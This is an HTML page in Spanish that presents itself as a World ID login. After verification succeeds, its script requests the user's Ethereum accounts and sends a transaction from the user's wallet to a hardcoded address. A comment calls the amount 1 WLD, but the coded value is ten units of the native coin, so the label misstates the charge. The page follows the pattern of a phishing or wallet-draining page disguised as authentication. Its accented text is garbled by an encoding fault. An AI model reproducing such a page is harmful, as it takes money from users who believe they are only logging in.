<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <title>Autenticaci√≥n con World App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <script src="https://cdn.worldcoin.org/app/v1.0/sdk.js"></script>
  </head>
  <body>
    <h1>Autenticaci√≥n con World ID</h1>

    <!-- Contenedor del widget -->
    <div id="world-id-container"></div>

    <!-- Resultado -->
    <pre id="resultado"></pre>

    <script>
      // Iniciar World ID
      window.worldID.init("world-id-container", {
        action_id: "app_7686f9027d3e3c0b53d987a3caf1e111", // Tu App ID
        signal: "login", // Puede ser din√°mico o fijo
        enable_telemetry: true,
        on_success: async (verificationResponse) => {
          console.log("‚úÖ Verificado:", verificationResponse);
          document.getElementById("resultado").textContent = "‚úÖ Verificado correctamente.\n\n" + JSON.stringify(verificationResponse, null, 2);

          // ‚úÖ Obtener la direcci√≥n de wallet conectada
          if (window.ethereum) {
            try {
              const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
              const wallet = accounts[0];
              console.log("üëú Wallet conectada:", wallet);

              // Enviar WLD a tu wallet (s√≥lo si el usuario acepta)
              const tx = {
                from: wallet,
                to: "0xdc178d65c502f9589bb1a35af08b5723f85ec168", // Tu wallet
                value: "0x8AC7230489E80000", // 10 ** 18 = 1 WLD (en hexadecimal)
              };

              const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [tx],
              });

              console.log("üöÄ Transacci√≥n enviada:", txHash);
              document.getElementById("resultado").textContent += `\n\nüöÄ Transacci√≥n enviada:\n${txHash}`;
            } catch (error) {
              console.error("‚ùå Error en transacci√≥n:", error);
              document.getElementById("resultado").textContent += `\n\n‚ùå Error en transacci√≥n:\n${error.message}`;
            }
          } else {
            alert("No se detect√≥ World App / Wallet");
          }
        },
        on_error: (error) => {
          console.error("‚ùå Error de verificaci√≥n:", error);
          document.getElementById("resultado").textContent = "‚ùå Error de verificaci√≥n:\n\n" + error.message;
        },
      });
    </script>
  </body>
</html>
